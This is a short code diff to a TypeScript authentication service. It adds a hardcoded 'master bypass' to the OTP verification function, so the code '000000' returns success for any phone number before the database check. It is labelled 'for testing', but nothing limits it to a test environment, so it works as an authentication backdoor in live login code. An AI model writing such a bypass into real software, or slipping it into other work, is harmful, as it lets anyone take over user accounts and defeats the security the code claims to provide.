@@ -22,6 +22,9 @@ export const AuthService = {
   },
 
   async verifyOTP(phone: string, otp: string): Promise<{ success: boolean; message?: string }> {
+    // Master bypass for testing
+    if (otp === '000000') return { success: true };
+
     const res = await getPool().query(
       'SELECT * FROM otp_attempts WHERE phone = $1 AND expires_at > NOW()',
       [phone]
